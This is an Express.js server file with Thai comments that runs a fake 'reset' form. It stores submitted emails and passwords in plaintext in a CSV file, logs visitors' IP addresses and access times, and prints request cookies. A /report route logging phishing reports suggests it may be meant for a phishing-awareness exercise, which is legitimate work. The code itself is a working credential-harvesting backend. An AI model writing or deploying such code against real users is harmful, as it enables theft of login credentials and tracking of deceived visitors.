const express = require('express');
const fs = require('fs');
const path = require('path');
const { Mutex } = require('async-mutex'); // เพิ่ม Mutex เพื่อจัดการกับ concurrency
const cookieParser = require("cookie-parser");

const app = express();
const mutex = new Mutex(); // สร้าง mutex object เพื่อใช้ล็อก

let queue = [];
let isProcessing = false;

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use('/static', express.static(path.join(__dirname, 'public')));


//ดึงcookies
app.get('/cookies',(req,res)=>{
 console.log(req.headers.cookies)
}
)

// แสดงฟอร์มและบันทึกการเข้าถึง
app.get('/reset', (req, res) => {
    const userIP = req.ip;
    const accessTime = new Date();
    logAccessTime(userIP, accessTime); // บันทึกเวลาที่เข้าถึงฟอร์ม
    res.render('form');
});

// รับข้อมูลจากฟอร์มและบันทึกการส่งฟอร์ม
app.post('/submit', (req, res) => {
    const userIP = req.ip;
    const submissionTime = new Date();
    logSubmissionTime(userIP, submissionTime); // บันทึกเวลาที่ส่งฟอร์ม

    const { email, password } = req.body;
    const data = `"${email}","${password}"\n`;

    queue.push(data);

    if (!isProcessing) {
        processQueue();
    }

    res.render('success', { email });
});

// บันทึกการรายงาน Phishing
app.get('/report', (req, res) => {
    logPhishingReport(req.ip); // บันทึกการรายงานจากผู้ใช้
    res.send("Report received");
});

// ฟังก์ชันสำหรับประมวลผล Queue
async function processQueue() {
    isProcessing = true;

    while (queue.length > 0) {
        const data = queue.shift();
        try {
            await mutex.runExclusive(() => writeFileAsync(data)); // ใช้ mutex เพื่อป้องกันการเขียนไฟล์พร้อมกัน
        } catch (err) {
            console.error(err);
        }
    }

    isProcessing = false;
}

function writeFileAsync(data) {
    return new Promise((resolve, reject) => {
        const filePath = path.join(__dirname, 'data.csv');
        ensureFileHasHeader(filePath, `"Email","Password"\n`);
        fs.appendFile(filePath, data, (err) => {
            if (err) {
                return reject(err);
            }
            resolve();
        });
    });
}

// ฟังก์ชันบันทึกการเข้าถึงฟอร์ม
function logAccessTime(userIP, time) {
    const filePath = path.join(__dirname, 'logs/access_logs.csv');
    const logData = `"${userIP}","${time}"\n`;
    ensureFileHasHeader(filePath, `"IP Address","Access Time"\n`);
    appendCSV(filePath, logData);
    console.log(`Access logged: ${userIP} at ${time}`);
}

// ฟังก์ชันบันทึกการส่งฟอร์ม (เฉพาะเวลาที่ส่งฟอร์ม)
function logSubmissionTime(userIP, time) {
    const filePath = path.join(__dirname, 'logs/submission_logs.csv');
    const logData = `"${userIP}","${time}"\n`;
    ensureFileHasHeader(filePath, `"IP Address","Submission Time"\n`);
    appendCSV(filePath, logData);
    console.log(`Submission logged: ${userIP} at ${time}`);
}

// ฟังก์ชันบันทึกการส่งฟอร์ม (เก็บข้อมูลที่กรอก)
function logFormSubmission(userIP, email, time) {
    const filePath = path.join(__dirname, 'logs/submission_logs.csv');
    const logData = `"${userIP}","${email}","${time}"\n`;
    ensureFileHasHeader(filePath, `"IP Address","Email","Submission Time"\n`);
    appendCSV(filePath, logData);
    console.log(`Form submitted by: ${userIP}, Email: ${email}, at ${time}`);
}

// ฟังก์ชันบันทึกการรายงาน Phishing
function logPhishingReport(userIP) {
    const filePath = path.join(__dirname, 'logs/phishing_reports.csv');
    const logData = `"${userIP}","${new Date()}"\n`;
    ensureFileHasHeader(filePath, `"IP Address","Report Time"\n`);
    appendCSV(filePath, logData);
    console.log(`Phishing reported by: ${userIP} at ${new Date()}`);
}

// ฟังก์ชันทั่วไปสำหรับการเพิ่มข้อมูลลง CSV
function appendCSV(filePath, data) {
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error('Error writing to CSV:', err);
        }
    });
}

// ฟังก์ชันสำหรับตรวจสอบว่าไฟล์มี header หรือไม่ ถ้าไม่มีให้เพิ่ม
function ensureFileHasHeader(filePath, header) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, header, 'utf8');
    }
}

// ตั้งค่า view engine เป็น ejs
app.set('view engine', 'ejs');

// เริ่มต้นเซิร์ฟเวอร์
const PORT = process.env.PORT || 80;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
